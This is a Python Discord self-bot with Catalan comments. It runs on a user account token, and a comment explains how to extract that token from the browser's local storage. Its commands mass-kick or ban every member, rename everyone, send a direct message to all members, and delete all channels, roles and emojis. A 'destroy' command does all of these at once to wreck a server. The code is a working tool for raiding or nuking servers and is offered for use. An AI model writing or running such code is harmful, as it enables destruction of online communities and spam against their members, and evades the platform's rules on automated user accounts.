# CONFIG
# ---------
token = "" # Per trobar-ho, obre les eines de desenvolupador al Discord (CTRL+SHIFT+I), després vés a "Application", "Local Storage", clica l'enllaç de Discord, i fes CTRL+R o F5. Apareixerà una secció anomenada "token". Allà es trobarà el token d'usuari.
prefix = "~" # Això s'utilitzarà al començament de les ordres.
# ----------

import discord
from discord.ext import commands
# Importa les llibreries necessàries.

print ("Espereu..")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")
# Declara el bot, li passa el prefix i el fa saber que només s'escolti a si mateix.

@bot.event
async def on_ready():
    print ("Estic llest per ser innocent.")
# Diu quan el bot està llest.

try:
    async def self_check(ctx):
        if bot.user.id == ctx.message.author.id:
            return True
        else:
            return False
    # Comprovació secundària per assegurar que ningú excepte el propietari pot executar ordres.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def kall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} ha estat expulsat de {ctx.guild.name}")
            except:
                print (f"No he pogut expulsar a {user.name} de {ctx.guild.name}")
        print ("Acció completada: kall")
    # Expulsa a tots els membres de un servidor.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def ball(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} ha estat vetat de {ctx.guild.name}")
            except:
                print (f"No he pogut vetar a {user.name} de {ctx.guild.name}")
        print ("Acció completada: ball")  
    # Veta a tots els membres de un servidor.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def rall(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"S'ha canviat el nom de {user.name} a {rename_to} en {ctx.guild.name}")
            except:
                print (f"NO s'ha pogut canviar el nom de {user.name} a {rename_to} en {ctx.guild.name}")
        print ("Acció completada: rall")
    # Canvia el nom de tots els membres de un servidor.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def mall(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} ha rebut el missatge.")
            except:
                print(f"{user.name} NO ha rebut el missatge.")
        print("Acció completada: mall")
    # Fa un MD a tots els membres de un servidor.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def dall(ctx, condition):
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} ha estat esborrat de {ctx.guild.name}")
                except:
                    print (f"{channel.name} NO s'ha pogut esborrar de {ctx.guild.name}")
            print ("Acció completada: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} ha estat esborrat de {ctx.guild.name}")
                except:
                    print (f"{role.name} NO s'ha pogut esborrar de {ctx.guild.name}")
            print ("Acció completada: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} ha estat esborrat de {ctx.guild.name}")
                except:
                    print (f"{emoji.name} NO s'ha pogut esborrar de {ctx.guild.name}")
            print ("Acció completada: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} ha estat esborrat de {ctx.guild.name}")
                except:
                    print (f"{channel.name} NO s'ha pogut esborrar de {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} ha estat esborrat de {ctx.guild.name}")
                except:
                    print (f"{role.name} NO s'ha pogut esborrar de {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} ha estat esborrat de {ctx.guild.name}")
                except:
                    print (f"{emoji.name} NO s'ha pogut esborrar de {ctx.guild.name}")
            print ("Acció completada: dall all")
    # Pot fer múltiples accions de esborrar massivament.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def destroy(ctx):
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} ha estat esborrat de {ctx.guild.name}")
            except:
                print (f"{emoji.name} NO s'ha pogut esborrar de {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} ha estat esborrat de {ctx.guild.name}")
            except:
                print (f"{channel.name} NO s'ha pogut esborrar de {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} ha estat esborrat de {ctx.guild.name}")
            except:
                print (f"{role.name} NO s'ha pogut esborrar de {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} ha sigut vetat de {ctx.guild.name}")
            except:
                print (f"No he pogut vetar a {user.name} de {ctx.guild.name}")
        print ("Acció completada: destroy")
    # Destrueix un servidor combinant totes les accions.

except:
    pass

bot.run(token, bot=False)
# Arranca el bot passant-li el token i dient-li que no és realment un bot.
